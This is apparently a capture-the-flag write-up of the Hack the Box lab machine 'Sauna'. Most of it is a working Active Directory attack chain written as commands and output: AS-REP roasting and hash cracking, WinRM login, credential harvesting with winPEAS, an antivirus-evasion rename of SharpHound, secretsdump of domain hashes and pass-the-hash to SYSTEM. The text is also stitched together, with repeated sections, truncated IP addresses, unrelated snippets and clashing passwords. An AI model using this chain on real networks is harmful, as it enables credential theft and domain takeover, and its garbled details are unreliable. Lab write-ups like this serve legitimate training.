+++
title = "Hack the Box: Sauna"
date = 2023-01-29
description = "Hack the Box: Sauna"
tags = [
    "Hack the Box",
    "Write-up"
]
categories = [
    "Hack the Box",
    "Write-up"
]
series = ["Hack the Box"]
+++

Hack the Box: Sauna

<!--more-->

# Sauna

## Recon

### Nmap

As usual we kick off with a nmap scan of the box

```
$ nmap-v -sV -sC -oA scans/nmap_sauna 10.10.10.
Nmap scan report for 10.10.10.
Host is up (0.083s latency).
Not shown: 988 filtered ports
PORT STATE SERVICE VERSION
53/tcp open domain?
| fingerprint-strings:
| DNSVersionBindReqTCP:
| version
|_ bind
80/tcp open http Microsoft IIS httpd 10.
| http-methods:
| Supported Methods: OPTIONS TRACE GET HEAD POST
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.
|_http-title: Egotistical Bank :: Home
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-14 04:55:07Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Na
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0.,Site: Default-First-Site-Na
3269/tcp open tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the followingfingerprint
SF-Port53-TCP:V=7.80%I=7%D=4/13%Time=5E94D0FD%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:


|_clock-skew: 8h02m57s
| smb2-security-mode:
| 2.02:
|_ Message signing enabled and required
| smb2-time:
| date: 2020-04-14T04:57:
|_ start_date: N/A
```

Read data files from: /usr/bin/…/share/nmap Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/ "https://nmap.org/submit/").

*Nmap done at Mon Apr 13 22:56:35 2020 – 1 IP address (1 host up) scanned in 301.13 seconds*

OK, there are some interesting services here:

- DNS (bind)
- HTTP (IIS 10.0)
- Kerberos
- SMB
- LDAP

### SMB

`msf5 > auxiliary/scanner/smb/smb_version` gives no results

`msf5 > auxiliary/scanner/smb/smb_ms17_010` gives no results

`msf5 > use post/multi/recon/local_exploit_suggester`

```
# systemctl start ssh
# ssh -R80:10.10.10.175:80 root@192.168.0.22
```

You need to allow root login otherwise can’t port forward. website should be access on loopback or local ip.

```
# netsat -antp
# netstat -tupln
# ps -elf | grep ssh
```

Let’s try to enumerate SMB shares as Guest (since we don’t have any creds, yet).

```
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_ACCOUNT_DISABLED(The referenced account is currently disabled and may not be logged
[!] Authentication error on 10.10.10.
```

No luck here.

### LDAP

Let’s enumerate LDAP.

```
$ nmap-v -sV --script ldap* -p 389 -oA scans/nmap_sauna_ldap 10.10.10.
Nmap scan report for 10.10.10.
Host is up (0.045s latency).

PORT STATE SERVICE VERSION
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
| ldap-brute:
| root:<empty>=> Valid credentials
| admin:<empty>=>Valid credentials
| administrator:<empty>=>Valid credentials
| webadmin:<empty>=> Valid credentials
| sysadmin:<empty>=> Valid credentials
| netadmin:<empty>=> Valid credentials
| guest:<empty>=>Valid credentials
| user:<empty>=> Valid credentials
| web:<empty>=> Valid credentials
|_ test:<empty>=> Valid credentials
| ldap-rootdse:
| LDAP Results
| <ROOT>
[...]
| serverName:CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
[...]
| ldap-search:
| Context: DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: DC=EGOTISTICAL-BANK,DC=LOCAL
[...]
```

```
| name: EGOTISTICAL-BANK
[...]
| dc: EGOTISTICAL-BANK
| dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
| dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
|_ dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We find the user Hugo Smith and the domain name egotistical-bank.local.

### HTTP

Let’s have a look at the website as well. There’s nothing really interesting on the site, except for the About page.

```
We could try to make a userlist from the names on this page. Perhaps we find one or more valid usernames?
Typical username formats are first.last or f.last.
$ catfindings/users.txt
fsmith
hbear
skerb
scoins
btaylor
sdriver
fergus.smith
hugo.bear
steven.kerb
shaun.coins
bowie.taylor
sophie.driver
```

```
gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirb/big.txt -t 30
enum4linux 10.10.10.175
```

Did find any valid users but we got:

-   Domain Name: EGOTISTICALBANK
-   Domain Sid: S-1-5-21-2966785786-3096785034-1186376766

If we navigate on the website we can see an /about page. What if the person there are also AD users ? Let’s write a python script in order to enumerate those usernames following the AD name convention:

```
# Input: text file containing name
# Output: username following the AD name convention based on the names provided

import os

class Brew(object):
    def __init__(self,filename):
        if os.path.exists(filename):
            print('[+] Found file:{}'.format(filename))
        else:
            print('[-] Not Found file:{}'.format(filename))
            exit()

        self.file=filename
        self.Brew()

    def Brew(self):
        dk=open(self.file,'r',encoding='utf-8')
        for r in dk.readlines():
            data="".join(r.split('\n'))
            jg1=".".join(data.split(' '))
            jg2=".a.".join(data.split(' '))
            jg3=data.split(' ')
            print(jg1)
            print(jg2)
            print(jg3[0][0]+jg3[1])
            print(jg3[0][0]+'a'+jg3[1])
            print(jg3[0][0] +jg3[0][1]+ jg3[1])
            print(jg3[0][0] + jg3[0][1]+'a'+ jg3[1])

if __name__ == '__main__':
    obj=Brew('input_users.txt')
```

And we get a list:

```
Fergus.Smith
Fergus.a.Smith
FSmith
FaSmith
FeSmith
FeaSmith
Shaun.Coins
Shaun.a.Coins
SCoins
SaCoins
ShCoins
ShaCoins
Hugo.Bears
Hugo.a.Bears
HBears
HaBears
HuBears
HuaBears
Bowie.Taylor
Bowie.a.Taylor
BTaylor
BaTaylor
BoTaylor
BoaTaylor
Sophie.Driver
Sophie.a.Driver
SDriver
SaDriver
SoDriver
SoaDriver
Steven.Kerb
Steven.a.Kerb
SKerb
SaKerb
StKerb
StaKerb
```

## Initial foothold

Now we can use GetNPUsers.py from impacket and try to get a kerberos ticket (TGT):

```
# python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile ~/Downloads/output_users.txt -format hashcat -outputfile ~/Downloads/output.txt -dc-ip 10.10.10.175
```

And we got one, let’s crack it using hashcat:

```
# $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:09bd7453cb12885cd4b9a42fb68f8b0c$715312af91be2ab0b4b0a192e305a4803f5d314f3f3c7127baf25855489acd7c1b15300c6a6b69b6d51c55bcf012c958aea2824dfd85289252183039a06ed20f8c53c080f65e016450f4e21005f00d6defa7723a9b06b28cd8d1c238ff06dbf3ad7d7d53da0037d6542d3d9d0118e127370c3469b4cadbab985e2a586c2bb8481128b1b34f74e7bdd2ae624b5d351af797635f927ab63e4c69f4b56d7060963c50825c5f0cc50c8b173430c76a0516a7175be37ad651ef7083bebfa5204f06494d7c123c336731a6365662f904a4ebb92bd6b46001dd63f25da031b33eaa13ed36e8ad02cbd8f0a5734dfa22c59f8c85b044a7bc4428ae107333b1d8722be6dc
# hashcat -m18200 '$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:09bd7453cb12885cd4b9a42fb68f8b0c$715312af91be2ab0b4b0a192e305a4803f5d314f3f3c7127baf25855489acd7c1b15300c6a6b69b6d51c55bcf012c958aea2824dfd85289252183039a06ed20f8c53c080f65e016450f4e21005f00d6defa7723a9b06b28cd8d1c238ff06dbf3ad7d7d53da0037d6542d3d9d0118e127370c3469b4cadbab985e2a586c2bb8481128b1b34f74e7bdd2ae624b5d351af797635f927ab63e4c69f4b56d7060963c50825c5f0cc50c8b173430c76a0516a7175be37ad651ef7083bebfa5204f06494d7c123c336731a6365662f904a4ebb92bd6b46001dd63f25da031b33eaa13ed36e8ad02cbd8f0a5734dfa22c59f8c85b044a7bc4428ae107333b1d8722be6dc' /usr/share/wordlists/rockyou.txt -O
# $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:Thestrokes23
```

You can have a look to hash examples here: [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes "https://hashcat.net/wiki/doku.php?id=example_hashes")

From the nmap result we know that the 5985 port is open, it correspond to WinRM service. We can use evil-winrm to abuse it since we have a user and password:

```
# evil-winrm -i 10.10.10.175 -u FSmith -p Thestrokes23
```

And we get a winrm session in order to get the user flag:

```
# type C:\Users\FSmith\Desktop\user.txt
1b5520b98d97cf17f24122a55baf70cf
```

In the C:\Users we can see other users:

```
# ls C:\Users
# net user
# ...
# svc_loanmgr
# ...
```

Let’s try to get informations about it. In the evil-winrm session :

```
# powershell "Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*""
```

Kerberos Ticket Granting Tickets (TGT) Let’s test our list of (potential) usernames and extract TGT to crack.

```
$ /opt/impacket/examples/GetNPUsers.py

Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
usage: GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE]
[-format{hashcat,john}] [-usersfile USERSFILE] [-debug]
[-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
[-dc-ip ip address]
target

Queries target domain for users with 'Do not require Kerberos
preauthentication' set and export their TGTs for cracking

$ /opt/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile findings/users.txt -outputfile findings/hash.txt

$ catfindings/hash.txt
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:36dff4a5bb03d0af2ac79d3e801634e3$06ec21d9b686ea6e5b8e9b04753f576fd97c366a94087d1fe7b
```

Looks like we discovered the username fsmith and managed to get a TGT.

Cracking this ticket, we get the password Thestrokes23.

```
$ hashcat -a 0 -m 18200 findings/hash.txt /usr/share/wordlists/rockyou.txt
$ krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:36dff4a5bb03d0af2ac79d3e801634e3$06ec21d9b686ea6e5b8e9b04753f576fd97c366a94087d1fe7b
```

### User flag

We can use these credentials to login onto the box.

```
$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes

Evil-WinRM shell v2.
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents>cd ../Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir

Directory: C:\Users\FSmith\Desktop

Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 1/23/2020 10:03 AM 34 user.txt

*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
1b5520b98d97cf17f24122a55baf70cf
```

## Privilege escalation

### Enumerate

Let’s enumerate a bit further.

```
*Evil-WinRM* PS C:\Users\FSmith\Documents>net user

User accounts for\\

-------------------------------------------------------------------------------
Administrator FSmith Guest
HSmith krbtgt svc_loanmgr

We find more usernames: HSmith , svc_loanmgr and (of course Administrator ).

We can also use winPEAS to collect more information.
Upload the .exe to the box and run it.

*Evil-WinRM* PS C:\Users\FSmith\Documents>upload /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x
Info: Uploading /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe
Data: 321536 bytes of 321536 bytes copied
Info: Upload successful!

*Evil-WinRM* PS C:\Users\FSmith\Documents>./winPEAS.exe
[...]
[+] Looking for AutoLogon credentials(T1012)
Some AutoLogon credentials were found!!
DefaultDomainName : EGOTISTICALBANK
DefaultUserName : EGOTISTICALBANK\svc_loanmanager
DefaultPassword : Moneymakestheworldgoround!

[+] Home folders found(T1087&T1083&T1033)
C:\Users\Administrator
C:\Users\All Users
C:\Users\Default
C:\Users\Default User
C:\Users\FSmith
C:\Users\Public
C:\Users\svc_loanmgr

[+] Looking AppCmd.exe()
[?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe You should try to search for credentials

[+] Checking for DPAPI Master Keys()
[?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
MasterKey: C:\Users\FSmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-2966785786-3096785034-1186376766-1105\ca6bc5b5-57d3-4f19-
Accessed: 1/24/2020 6:30:19 AM
Modified: 1/24/2020 6:30:19 AM

[+] Looking for common SAM&SYSTEM backups()
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\SYSTEM
```

We find a potential password for svc_loanmanager : Moneymakestheworldgoround!.

AppCmd.exe was discovered as well, but none of the techniques seemed to work. There’s also a DPAPI Master Key, which we could ‘attack’ with mimikatz.

We can also use winPEAS in a evil-winrm session : [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe") :

```
# upload winPEAS.exe
# powershell "C:\Users\FSmith\Documents\winPEAS.exe cmd fast"
```

`AppCmd.exe` was discovered as well, but none of the techniques seemed to work. There’s also a DPAPI Master Key.

```
# msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.10.175
# msf5 auxiliary(scanner/smb/smb_login) > set SMBPass Moneymakestheworldgoround!
# msf5 auxiliary(scanner/smb/smb_login) > set SMBuser svc_loanmgr
# msf5 auxiliary(scanner/smb/smb_login) > run
```

```
# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!
```

Upload SharpHound in the winrm session (rename it to bypass any basic AV). Execute it and download back the zip file for bloodhound:

```
# upload /opt/BloodHound/Ingestors/SharpHound.exe SH.exe
# C:\Users\svc_loanmgr\Documents\SH.exe
# download C:\Users\svc_loanmgr\Documents\20200429152936_BloodHound.zip /home/robin/Download/20200429152936_BloodHound.zip
```

Let’s use secretsdump to get the Administator hash:

```
# sudo impacket-secretsdump -just-dc-ntlm egotisticalbank.local/svc_loanmgr:"Moneymakestheworldgoround\!"@10.10.10.175
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
```

### Hashdump

Let’s try the credentials we found to do a hashdump.

```
$ /opt/impacket/examples/secretsdump.py
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

usage: secretsdump.py [-h] [-debug] [-system SYSTEM] [-bootkey BOOTKEY]
[-security SECURITY] [-sam SAM] [-ntds NTDS]
[-resumefile RESUMEFILE] [-outputfile OUTPUTFILE]
[-use-vss] [-exec-method [{smbexec,wmiexec,mmcexec}]]
[-just-dc-user USERNAME] [-just-dc] [-just-dc-ntlm]
[-pwd-last-set] [-user-status] [-history]
[-hashes LMHASH:NTHASH] [-no-pass] [-k]
[-aesKey hex key] [-dc-ip ip address]
[-target-ip ip address]
target
```

Performs various techniques to dump secrets from the remote machine without executing any agent there.

```
$ /opt/impacket/examples/secretsdump.py EGOTISTICAL-BANK/svc_loanmgr@10.10.10.
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
```

```
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:87408da437fc482b3d33f8846565ca96:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d
Administrator:des-cbc-md5:19d5f15d689b1ce
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa
krbtgt:des-cbc-md5:c170d5dc3edfc1d
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a
SAUNA$:aes256-cts-hmac-sha1-96:60519d04845ef6658c94529aa8fc8220f868f0f4472f49ac8752b04d0ecaecc
SAUNA$:aes128-cts-hmac-sha1-96:a3364c8713207d94239da98ecb4483b
SAUNA$:des-cbc-md5:104c515b86739e
[*] Cleaning up...
```

### Pass-the-Hash

We find a hash for the Administrator account, we can use this in a Pass-the-Hash attack.

```
$ /opt/impacket/examples/psexec.py
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-debug]
[-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
[-dc-ip ip address] [-target-ip ip address]
[-port [destination port]] [-service-name service name]
target [command [command ...]]

PSEXEC like functionality example using RemComSvc.

$ /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dffAdministrator@10.10.
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file KHHXRiQe.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service EnTK on 10.10.10.175.....
[*] Starting service EnTK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c)2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

### Root flag

TADA

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
f3ee04965c68257382e31502cc5e881f
```
